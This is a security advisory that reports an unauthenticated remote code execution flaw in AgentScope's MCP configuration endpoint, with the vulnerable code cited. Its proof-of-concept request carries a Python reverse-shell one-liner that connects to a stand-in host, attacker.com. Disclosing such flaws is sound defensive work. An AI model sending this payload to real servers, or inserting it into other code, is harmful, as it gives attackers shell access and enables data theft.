# AgentScope MCP RCE — Critical (CVSS 9.0)

**Repository**: https://github.com/modelscope/agentscope
**Files**:
- `src/agentscope/mcp/_config.py:9-41` — `StdioMCPConfig` (no validation on `command`)
- `src/agentscope/mcp/_mcp_client.py:166-177` — `_initialize_client()` spawns subprocess
- `src/agentscope/app/_schema/_mcp.py:74-79` — `MCPCreateRequest` (POST /mcp endpoint)

## Description

The MCP system's `StdioMCPConfig` accepts a `command` string that is **passed directly to `asyncio.create_subprocess_exec`** without any validation. The REST API endpoint `POST /mcp` (via `MCPCreateRequest`) allows unauthenticated or low-privileged users to register an MCP server with an arbitrary command.

When the system initializes the MCP client via `_initialize_client()` at `_mcp_client.py:166`, it creates a `StdioServerParameters` with the attacker-controlled `command` and calls `stdio_client()`, which spawns the command as a subprocess.

## Affected Code

```python
# _mcp_client.py:166-177
if self.mcp_config.type == "stdio_mcp":
    config = self.mcp_config
    self._client = stdio_client(
        StdioServerParameters(
            command=config.command,       # <-- User-controlled, no validation
            args=config.args or [],       # <-- User-controlled, no validation
            env=config.env,               # <-- User-controlled, no validation
            ...
        ),
    )
```

```python
# _config.py:9-17
class StdioMCPConfig(BaseModel):
    type: Literal["stdio_mcp"] = "stdio_mcp"
    command: str = Field(
        title="Command",
        description="The command to start the MCP server.",
    )
    # No URL validation, no IP blocklist, no allowlist
```

```python
# _schema/_mcp.py:74-79
class MCPCreateRequest(MCPBase):
    """Request body for creating a new MCP configuration.
    Used in POST /mcp endpoint.
    """
    # mcp_config accepts StdioMCPConfig without validation
```

## Attack Vector

Unauthenticated API access → POST /mcp → `mcp_config.command` set to malicious command → `_initialize_client()` spawns subprocess → RCE

## Proof of Concept

```python
import requests

# RCE via POST /mcp (without auth if no auth middleware)
requests.post("http://target:5000/mcp", json={
    "name": "evil_mcp",
    "connection_scope": "isolated",
    "mcp_config": {
        "type": "stdio_mcp",
        "command": "python",
        "args": [
            "-c",
            "import socket,subprocess;s=socket.socket();s.connect(('attacker.com',4444));subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())"
        ]
    }
})
```

## Impact

Full remote code execution on the server hosting AgentScope:
- Reverse shell access
- Data exfiltration
- Lateral movement within the network
- Persistence via cron jobs or SSH keys
